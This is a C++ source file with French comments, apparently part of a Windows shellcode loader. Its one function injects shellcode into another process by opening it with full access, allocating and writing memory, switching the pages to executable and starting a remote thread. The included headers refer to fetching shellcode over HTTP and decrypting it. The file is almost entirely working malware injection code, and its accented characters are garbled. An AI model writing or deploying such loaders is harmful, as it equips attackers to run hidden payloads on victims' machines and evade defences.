#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#include "Memory.h"  // Supposons que vous avez un fichier d'en-t�te pour l'injection de shellcode
#include "HTTPClient.h"    // Supposons que vous avez un fichier pour r�cup�rer le shellcode via HTTP
#include "Decrypt.h"  // Si vous avez besoin de d�chiffrer le shellcode

// Fonction pour injecter le shellcode dans le processus local
bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
    // Ouvrir le processus distant avec les droits n�cessaires
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
        return false;
    }
    std::cout << "Processus cible ouvert avec succ�s." << std::endl;

    // Allouer de la m�moire dans l'espace m�moire du processus distant
    LPVOID remoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (remoteAddr == NULL) {
        std::cerr << "Erreur : �chec de l'allocation m�moire dans le processus distant !" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "M�moire allou�e � distance � l'adresse : " << remoteAddr << std::endl;

    // �crire le shellcode dans la m�moire allou�e du processus distant
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,
        remoteAddr,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );
    if (!success || bytesWritten != shellcodeSize) {
        std::cerr << "Erreur : �chec de l'�criture du shellcode dans la m�moire distante !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    else {
        std::cout << "Shellcode �crit avec succ�s dans la m�moire distante." << std::endl;

    }

    // Modifier les permissions de la m�moire pour permettre l'ex�cution
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : �chec de VirtualProtectEx pour rendre la m�moire ex�cutable !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Permissions chang�es en PAGE_EXECUTE_READ." << std::endl;


    // Cr�er un thread pour ex�cuter le shellcode

    // Cr�er un thread dans le processus distant pour ex�cuter le shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        std::cerr << "Erreur : �chec de CreateRemoteThread dans le processus distant !" << std::endl;
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    std::cout << "Thread cr�� avec succ�s dans le processus distant." << std::endl;

    // Attendre la fin du thread
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "Le shellcode a �t� ex�cut� dans le processus distant." << std::endl;

    // Nettoyer les ressources
    CloseHandle(hThread);
    //VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return true;
}
